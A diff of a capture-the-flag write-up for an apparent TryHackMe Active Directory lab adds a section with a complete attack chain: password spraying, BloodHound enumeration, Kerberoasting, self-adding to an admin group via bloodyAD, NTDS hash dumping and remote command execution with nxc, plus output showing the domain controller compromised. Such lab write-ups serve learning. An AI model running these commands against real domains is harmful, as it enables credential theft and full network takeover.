@@ -184,7 +184,42 @@ svc-drop:xxxxxxxxxxxx
 {Global search} :- Control + shift + F ==> Type (username,password)
 Found Creds j.harris:xxxxxxxxxxxxx2026!
 ```
-#### DC
-> Adding soon!, i am going to sleep tonigh
+#### Pivoting using ligolo-ng
+> updating..
+#### DC and WRK
+```bash
+[Intial Access]
+Create Creds file and Spray Username and Passwords over DC and WRK.
+nxc smb $DC -u 'users' -p 'passwd'  --continue-on-success
+==> j.harris:xxxxxxxxxx
+
+[Post Exploitation]
+##### Bloodhound
+nxc ldap $DC -u 'j.harris' -p 'xxxxxx' --bloodhound --collection All --dns-server $DC
+bloodhound-python -d deaddrop.loc -u 'j.harris' -p 'xxxxxxx' -ns $DC -dc DEADDROP-DC.deaddrop.loc -c All --zip
+bloodyAD --host $DC -d deaddrop.loc -u 'j.harris' -p 'xxxxxx'  get bloodhound --transitive --path .
+rusthound --domain deaddrop.loc -u 'j.harris' -p 'xxxxxxxx'  --zip
+
+##### lilzey
+connect j.harris $PASS deaddrop.loc 192.168.11.100
+==> kerberoasting
+==> checkacl   {Found}:- AddMembers Permissions over Admin Groups.
+
+##### AddMembers to ITSupport-Admin Group
+bloodyAD --host DEADDROP-DC.deaddrop.loc -d deaddrop.loc -u j.harris -p xxxxxxxx add groupMember "ITSupport-Admins" j.harris
+
+
+[Dumping]
+nxc smb $DC -u 'j.harris' -p 'xxxxx' --ntds
+nxc smb $DC -u 'j.harris' -p 'xxxxx' -x 'type C:\users\administrator\desktop\flag.txt'
+
+[Bonus]
+┌──(root㉿kali)-[/capstone/loot]
+└─# nxc smb $DC -u 'j.harris' -p 'xxxxxxxxxx' -x 'type C:\users\administrator\desktop\flag.txt'
+SMB         192.168.11.100  445    DEADDROP-DC      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEADDROP-DC) (domain:deaddrop.loc) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         192.168.11.100  445    DEADDROP-DC      [+] deaddrop.loc\j.harris:xxxxxxx (Pwn3d!)
+SMB         192.168.11.100  445    DEADDROP-DC      [+] Executed command via wmiexec
+SMB         192.168.11.100  445    DEADDROP-DC      THM{d34d_dr0p_d0m41n_pwn3d}
+```
 
 > I am keep updating all Challenge Writeups...
